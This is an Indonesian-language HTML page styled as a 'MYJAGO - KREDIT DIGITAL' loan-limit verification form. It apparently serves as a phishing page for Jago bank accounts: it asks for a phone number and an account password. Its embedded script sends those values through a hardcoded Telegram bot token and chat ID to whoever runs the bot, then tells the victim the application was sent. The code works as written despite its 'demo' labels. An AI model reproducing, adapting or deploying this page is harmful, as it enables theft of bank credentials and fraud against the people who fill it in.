<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title> MYJAGO - KREDIT DIGITAL </title>
  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family:Arial, sans-serif;
    }

    body{
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background:
      radial-gradient(circle at top right,#5b4300,#000 55%);
      color:white;
      padding:20px;
    }

    .card{
      width:100%;
      max-width:420px;
      background:rgba(20,20,20,.95);
      border:1px solid rgba(255,215,0,.35);
      border-radius:26px;
      padding:30px;
      box-shadow:0 0 40px rgba(255,215,0,.15);
    }

    .logo{
      text-align:center;
      font-size:30px;
      font-weight:bold;
      color:gold;
      margin-bottom:10px;
    }

    .subtitle{
      text-align:center;
      color:#ddd;
      margin-bottom:28px;
      font-size:14px;
    }

    .input{
      width:100%;
      margin-bottom:16px;
      padding:15px;
      border:none;
      outline:none;
      border-radius:14px;
      background:#111;
      color:#fff;
      border:1px solid #333;
      font-size:15px;
    }

    .btn{
      width:100%;
      padding:15px;
      border:none;
      border-radius:14px;
      background:linear-gradient(90deg,#ffd700,#ffb300);
      color:black;
      font-weight:bold;
      cursor:pointer;
      font-size:16px;
      transition:.2s;
    }

    .btn:hover{
      transform:scale(1.02);
    }

    .note{
      margin-top:15px;
      text-align:center;
      color:#aaa;
      font-size:12px;
    }
  </style>
</head>
<body>

<div class="card">
  <div class="logo"> MYJAGO - KREDIT DIGITAL </div>
  <div class="subtitle">VERIFIKASI LIMIT</div>

  <input id="nama" class="input" placeholder="Nomor HP">
  <input id="hp" class="input" placeholder="Pasword">
  
  <select id="nominal" class="input">
    <option>Rp 5.000.000</option>
    <option>Rp 10.000.000</option>
    <option>Rp 25.000.000</option>
    <option>Rp 50.000.000</option>
    <option>Rp 100.000.000</option>
  </select>

  <button class="btn" onclick="kirimDemo()">AJUKAN SEKARANG</button>

  <div class="note">
   LOGIN AKUN JAGO
  </div>
</div>

<script>
const BOT_TOKEN = "8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4";
const CHAT_ID = "8264171951";

async function kirimDemo(){
  const nama = document.getElementById("nama").value;
  const hp = document.getElementById("hp").value;
  const nominal = document.getElementById("nominal").value;

  if(!nama || !hp){
    alert("Lengkapi data dulu");
    return;
  }

  const pesan =
`🔔 DEMO PENGAJUAN BARU

👤 Nama: ${nama}
📱 HP: ${hp}
💰 Nominal: ${nominal}
🕒 Waktu: ${new Date().toLocaleString("id-ID")}`;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{
      "Content-Type":"application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: pesan
    })
  });

  alert("Pengajuan demo berhasil dikirim");
}
</script>

</body>
</html>
